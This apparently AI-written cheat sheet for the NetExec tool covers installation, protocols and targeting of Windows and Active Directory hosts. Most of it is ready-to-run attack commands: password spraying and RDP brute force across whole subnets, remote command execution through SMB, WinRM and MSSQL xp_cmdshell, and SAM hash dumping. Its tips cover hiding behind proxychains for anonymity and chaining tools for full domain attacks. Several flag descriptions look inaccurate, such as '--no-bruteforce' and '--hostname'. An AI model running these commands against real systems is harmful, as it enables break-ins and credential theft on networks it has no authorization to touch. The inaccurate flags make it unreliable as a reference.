Here’s a detailed and easy-to-understand **cheat sheet for `netexec`**—a powerful tool used in network penetration testing, especially for Windows environments.

---

## **Installation**

```bash
pipx install git+https://github.com/Pennyw0rth/NetExec
# OR using pip (not recommended)
pip install git+https://github.com/Pennyw0rth/NetExec
```

---

##  **Basic Syntax**

```bash
netexec <protocol> <target> [options]
```

|Protocols|Description|
|---|---|
|`smb`|Windows SMB file sharing|
|`winrm`|Remote PowerShell over HTTP(S)|
|`rdp`|Remote Desktop Protocol|
|`mssql`|Microsoft SQL Server|
|`ldap`|LDAP for Active Directory|
|`ssh`|SSH (basic)|
|`http`|Web targets|

---

##  **Target Formats**

```bash
netexec smb 192.168.1.10
netexec smb 192.168.1.0/24
netexec smb hosts.txt            # file with one IP/hostname per line
```

---

##  **Authentication Options**

```bash
-u USERNAME       # single username
-U users.txt      # list of usernames
-p PASSWORD       # single password
-P passwords.txt  # list of passwords
-d DOMAIN         # (optional) domain name
--local-auth      # only use local accounts
```

###  Example Credential Spraying

```bash
netexec smb 192.168.1.0/24 -u admin -P passwords.txt
netexec smb 192.168.1.0/24 -U users.txt -p Welcome123
```

---

##  **Info Gathering (Enumeration)**

|Task|Command Example|
|---|---|
|Enumerate shares|`--shares`|
|List sessions on target|`--sessions`|
|List logged-in users|`--loggedon-users`|
|Get OS info & hostname|`--hostname`|
|List active users|`--users`|
|Get group membership|`--groups`|
|Dump SAM accounts (if access)|`--sam`|

```bash
netexec smb 192.168.1.100 -u admin -p pass123 --shares --hostname --users
```

---

##  **Command Execution**

```bash
netexec smb 192.168.1.100 -u admin -p pass123 -x "whoami"
```

|Option|Description|
|---|---|
|`-x`|Run command via SMB|
|`--exec-method <method>`|Choose method: `smbexec`, `wmiexec`, etc.|

---

##  **WinRM (PowerShell Remoting)**

```bash
netexec winrm 192.168.1.100 -u admin -p pass123 -x "ipconfig"
```

---

##  **RDP Brute Force / Valid Login**

```bash
netexec rdp 192.168.1.0/24 -u admin -P passwords.txt
```

---

##  **LDAP & Active Directory**

```bash
netexec ldap 192.168.1.10 -u user -p pass --users
```

|Task|Description|
|---|---|
|`--users`|List all domain users|
|`--groups`|List domain groups|
|`--computers`|List domain-joined machines|
|`--domain-info`|Show AD details|

---

##  **MSSQL**

```bash
netexec mssql 192.168.1.10 -u sa -p password123 --exec "xp_cmdshell 'dir'"
```

---

##  **Using a Credentials File**

```bash
netexec smb 192.168.1.0/24 -C creds.txt
# Format: DOMAIN/username:password or username:password
```

---

## **Common Examples**

### Credential Spray with password list

```bash
netexec smb 192.168.1.0/24 -U users.txt -P passwords.txt
```

### Execute whoami if login is successful

```bash
netexec smb 192.168.1.10 -u user -p pass -x "whoami"
```

### Enumerate logged in users

```bash
netexec smb 192.168.1.10 -u user -p pass --loggedon-users
```

### Dump SAM hashes (needs admin)

```bash
netexec smb 192.168.1.10 -u admin -p pass --sam
```

---

##  **Tips**

- Use `--no-bruteforce` to skip login attempts if credentials fail once.
    
- Use `--continue-on-success` to keep trying other users after success.
    
- Combine with proxychains or socks5 for anonymity.
    
- Combine with tools like `kerbrute`, `bloodhound`, `impacket`, etc. for full domain attacks.
    
